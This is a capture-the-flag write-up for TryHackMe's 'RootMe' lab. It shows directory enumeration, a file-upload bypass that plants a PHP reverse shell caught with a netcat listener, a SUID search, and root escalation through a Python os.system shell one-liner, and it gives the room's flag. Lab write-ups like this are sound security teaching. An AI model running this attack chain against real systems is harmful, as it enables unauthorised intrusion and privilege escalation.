---
layout: default
title: RootMe
parent: TryHackMe
---
# CTF Writeup: [RootMe](https://tryhackme.com/room/rrootme)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Tags](https://img.shields.io/badge/Tags-File%20Upload%20%7C%20SUID%20Python-orange)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 08.11.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/SeZaR)

---
## 1. Reconnaissance
```bash
gobuster dir -u http://<Machine-IP>/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt

/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

We need the `/panel` which is a file upload page.

## 2. Initial Access
### Exploitation
We can create a reverse shell using [***PentestMonkey***](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and upload with the `.php5` extension.
Then open the file on the following url while opening your netcat.

```bash
nc -lnvp 1234
```

```
rootme.thm/uploads/php-reverse-shell.php5
```

### Find SUID Binaries
Search for files with the SUID bit set.

```bash
find / -type f -perm -4000 2>/dev/null
```

Or, using the THM hint (finding files owned by root with the SUID bit):

```bash
find / -user root -perm /4000
```

## 3. Priviledge Escalation
We can exploit the following SUID binary:

`/usr/bin/python2.7`

Run the following command to gain a shell:

```bash
python -c 'import os; os.system("/bin/sh")'
```

### 4. Flag

`THM{pr1v1l3g3_3sc4l4t10n}`

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
